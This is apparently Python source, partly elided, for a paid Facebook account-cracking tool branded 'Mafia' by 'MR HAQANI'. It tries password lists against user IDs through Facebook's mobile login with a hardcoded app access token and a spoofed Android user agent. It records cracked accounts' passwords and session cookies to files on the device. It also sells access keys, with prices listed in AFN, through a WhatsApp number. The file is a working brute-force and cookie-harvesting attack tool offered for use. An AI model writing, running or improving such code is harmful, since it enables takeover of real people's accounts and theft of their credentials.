...
88  88  88 88   88 88        .88.   88   88      
YP  YP  YP YP   YP YP      Y888888P YP   YP \033[1;32m Tool\033[1;37m 
 \033[1;95m
 \033[1;92m-------------------------------------------------------
\033[1;32m•\033[1;37m CREATED BY  \033[1;32m •|✓\033[1;37m  MR HAQANI 
\033[1;32m•\033[1;37m FACEBOOK    \033[1;32m •|✓\033[1;37m  MR HAQANI 
\033[1;32m•\033[1;37m FRIENDS     \033[1;32m •|✓\033[1;37m  NSR.      
\033[1;32m•\033[1;37m TOOLS       \033[1;32m •|✓\033[1;37m  PAID.     
\033[1;32m•\033[1;37m VERSION     \033[1;32m •|✓\033[1;37m  \033[1;32m5.0\033[1;37m       
 \033[1;92m-------------------------------------------------------"""
def line():
	print(f'\033[1;32m-----------------------------------------------')
...
def api1(ids,names,passlist):
	try:
		...
		sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mMafia\x1b[1;92m-\x1b[1;92mM1\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()	
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
		...
		for pw in passlist:
			...
			if 'session_key' in po:
				uid = str(po['uid'])
				print('\r\r\033[1;32m [Mafia-OK] '+uid+' | '+pas+'|'+asha(uid)+'\033[1;32m')                                
				ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
				ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
				cookies = f"sb={ssbb};{ckkk}"
				print('\033[1;32m [🥀] Cookies :- '+cookies)
				open('/sdcard/Mafia-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n')
				oks.append(uid)
				break
			elif 'www.facebook.com' in po['error']['message']:
				uid = str(po['error']['error_data']['uid'])
				print(f'\r\r\033[1;33m [Mafia-CP] '+uid+' | '+pas+'\033[1;97m')
...
def rd(ids,passlist):
	try:
		...
		sys.stdout.write('\r\r\033[1;32m [\x1b[1;92mMafia\x1b[1;92m-\x1b[1;92m\x1b[1;92m] %s|\033[1;32mOK|%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()		
		for pas in passlist:                                          
			accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
			ua = 'Dalvik/2.1.0 (Linux; Android 8.0.0; RNE-L21 Build/HUAWEIRNE-L21) [FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=1080,height=1920};FBLC/de_DE;FBRV/279865282;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]'			
			...
			if 'session_key' in po:
				...
				uid = str(po['error']['error_data']['uid'])
				print(f'\r\r\033[1;31m [Mafia-CP] '+uid+' | '+pas+'\033[1;97m')
				open('/sdcard/Mafia-CP.txt','a').write(uid+'|'+pas+'\n')
				cps.append(uid)
				break
			else:
				continue
...
def approval():
  ...
  try:
    ...
    if id in httpCaht:
      ...
      print("YOUR KEY : "+id)
      print('\33[1;37m----------------------------------------------')
      print("\33[1;32mNOTE:TOOL IS PAID BUT YOU HAVE TO\nGET APPROVAL FIRST.")
      print("\33[1;37m----------------------------------------------")
      
      
      print("\33[1;32m monthly price 250 AFN.")
      print("\33[1;32m 2weekly price 150 AFN.")
      print("\33[1;32m 1weekly price 90 AFN.")
      print("\33[1;32m 3DAY price 50 AFN.")
      
      
      print('\33[1;37m----------------------------------------------')
      print ('IF U FREE USER DON.T COME IB')
      input('IF U WANT TO BUY THEN PRESS ENTER ')
      tks = ('Hello%MAFIA%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+93787276430?text='+tks),approval()
      time.sleep(1)
      menu()
  except:
    sys.exit()
